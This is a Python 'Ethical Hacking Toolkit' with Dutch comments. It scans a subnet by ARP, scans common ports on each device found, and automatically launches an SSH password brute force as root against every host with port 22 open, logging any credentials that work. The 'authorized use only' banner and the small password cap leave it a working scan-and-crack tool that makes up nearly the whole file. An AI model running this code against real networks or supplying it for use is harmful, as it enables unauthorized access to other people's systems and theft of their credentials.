import warnings
import datetime
import socket
import base64
import json
import logging
import sys
from typing import Dict, List, Union, Any, Optional
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import platform
import asyncio
import time

# Onderdruk waarschuwingen
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*TripleDES.*")

from scapy.all import ARP, Ether, srp, get_working_ifaces
import paramiko

# Voorkom onnodige logging
logging.getLogger("scapy").setLevel(logging.ERROR)
logging.getLogger("paramiko").setLevel(logging.WARNING)

# Configuratie
MAX_SCAN_PORTS = 15
MIN_RATE_LIMIT = 1.0
MAX_HISTORY_FILES = 3

# Configureer logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('toolkit.log'), logging.StreamHandler()]
)

def save_results(data: Dict, filename: str = "scan_results") -> None:
    """Opslaan van resultaten met automatische opschoning"""
    try:
        results_dir = Path("./results")
        results_dir.mkdir(parents=True, exist_ok=True)

        # Verwijder oudere bestanden
        json_files = sorted(results_dir.glob("*.json"), key=lambda f: f.stat().st_mtime, reverse=True)
        for old_file in json_files[MAX_HISTORY_FILES:]:
            try:
                old_file.unlink()
                logging.debug(f"Verwijderd: {old_file.name}")
            except Exception as e:
                logging.error(f"Verwijderen mislukt: {str(e)}")

        # Genereer bestandsnaam
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = base64.b64encode(f"{filename}_{timestamp}".encode()).decode()
        output_path = results_dir / f"{safe_name}.json"

        # Schrijf data
        with output_path.open('w') as f:
            json.dump({
                "timestamp": timestamp,
                "data": data
            }, f, indent=2, default=str)

        logging.info(f"Resultaten opgeslagen: {output_path.name}")

    except Exception as e:
        logging.error(f"Opslagfout: {str(e)}")

def arp_scan(target_ip: str = "192.168.1.0/24") -> Optional[List[Dict[str, str]]]:
    """Geavanceerde ARP-scanner met interface detectie en terugkeeroptie"""
    logging.info("ARP-scan initialiseren...")
    
    try:
        available_ifaces = [iface for iface in get_working_ifaces() if iface.ip]
        if not available_ifaces:
            logging.error("Geen bruikbare interfaces gevonden")
            return []

        # Interface selectie
        print("\nBeschikbare interfaces:")
        for idx, iface in enumerate(available_ifaces):
            print(f"[{idx}] {iface.name} - {iface.ip}")
        print("[99] Terug naar hoofdmenu")

        while True:
            try:
                choice_input = input(f"Kies interface (0-{len(available_ifaces)-1}, of 99 om terug te keren): ")
                if choice_input == "99":
                    return None  # Speciaal signaal voor hoofdmenu
                choice = int(choice_input)
                iface = available_ifaces[choice]
                break
            except (ValueError, IndexError):
                print("Ongeldige keuze, probeer opnieuw.")

        logging.info(f"Scannen van {target_ip} via {iface.name}...")

        # ARP-pakket constructie
        arp_layer = ARP(pdst=target_ip)
        ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether_layer/arp_layer

        # Scan uitvoeren
        result, _ = srp(
            packet,
            iface=iface.name,
            timeout=5,
            verbose=0,
            inter=0.1
        )

        devices = [{
            'IP': received.psrc,
            'MAC': received.hwsrc,
            'Interface': iface.name
        } for sent, received in result]

        if not devices:
            logging.warning("Geen apparaten gevonden - controleer netwerkinstellingen")

        return devices

    except Exception as e:
        logging.critical(f"ARP-scan fout: {str(e)}")
        return []

async def check_port(host: str, port: int) -> Optional[tuple]:
    """Controleer of een poort open is"""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=1.5
        )
        writer.close()
        await writer.wait_closed()
        
        # Service naam bepalen
        try:
            service = socket.getservbyport(port)
        except (OSError, socket.error):
            service = "onbekend"
            
        return (port, service)
    except Exception:
        return None  # Geeft expliciet None terug bij fouten

async def async_port_scan(host: str, ports: List[int] = None) -> Dict[int, str]:
    """Asynchrone portscanner met verbeterde foutafhandeling"""
    logging.info(f"Portscan gestart voor {host}")
    
    default_ports = [21, 22, 23, 80, 443, 8080, 3389, 5900]
    ports = ports[:MAX_SCAN_PORTS] if ports else default_ports
    
    open_ports = {}
    tasks = [check_port(host, port) for port in ports]
    results = await asyncio.gather(*tasks)
    
    for result in results:
        if result is not None:
            port, service = result
            open_ports[port] = service
            logging.warning(f"Poort {port} ({service}) is open")
    
    return open_ports

def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_workers: int = 3) -> bool:
    """Beveiligde SSH bruteforce met rate limiting"""
    logging.warning(f"SSH bruteforce gestart op {host}:{port}")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    
    try:
        with open("passwords.txt") as f:
            passwords = [line.strip() for line in f if line.strip()][:10]  # Max 10 wachtwoorden
    except FileNotFoundError:
        logging.error("passwords.txt niet gevonden!")
        return False

    def try_password(password: str) -> bool:
        try:
            time.sleep(MIN_RATE_LIMIT)
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=3,
                banner_timeout=3
            )
            logging.critical(f"SUCCESVOL: {username}:{password}")
            client.close()
            return True
        except Exception as e:
            logging.debug(f"Mislukt: {password}")
            return False

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for result in executor.map(try_password, passwords):
                if result:
                    return True
        return False
    except Exception as e:
        logging.error(f"SSH fout: {str(e)}")
        return False

async def main():
    print("=== Ethical Hacking Toolkit ===")
    print("Alleen voor geautoriseerd gebruik!\n")
    
    if platform.system() == "Windows":
        print("[!] Draai als Administrator")
    
    target = input("Target IP/netwerk: ").strip()
    if '/' not in target:
        target += "/24"
        logging.info(f"Subnet toegevoegd: {target}")

    results = {
        'arp_scan': [],
        'open_ports': {},
        'ssh_bruteforce': {}
    }

    # ARP Scan met terugkeeroptie
    arp_result = arp_scan(target)
    if arp_result is None:
        print("\nTerug naar hoofdmenu...")
        return  # Keer terug naar hoofdmenu/hoofdscript

    results['arp_scan'] = arp_result
    
    if results['arp_scan']:
        for device in results['arp_scan']:
            current_ip = device['IP']
            try:
                results['open_ports'][current_ip] = await async_port_scan(current_ip)
                if 22 in results['open_ports'][current_ip]:
                    results['ssh_bruteforce'][current_ip] = ssh_bruteforce(current_ip)
                else:
                    results['ssh_bruteforce'][current_ip] = "Niet uitgevoerd (poort 22 gesloten)"
            except Exception as e:
                logging.error(f"Fout bij {current_ip}: {str(e)}")
                if current_ip not in results['open_ports']:
                    results['open_ports'][current_ip] = {}
                if current_ip not in results['ssh_bruteforce']:
                    results['ssh_bruteforce'][current_ip] = "Fout tijdens scan"

    save_results(results)
    print("\n[!] Scan voltooid. Bekijk de resultatenbestanden.")

if __name__ == "__main__":
    if not sys.warnoptions:
        import os
        os.environ["PYTHONWARNINGS"] = "ignore::DeprecationWarning"
    asyncio.run(main())
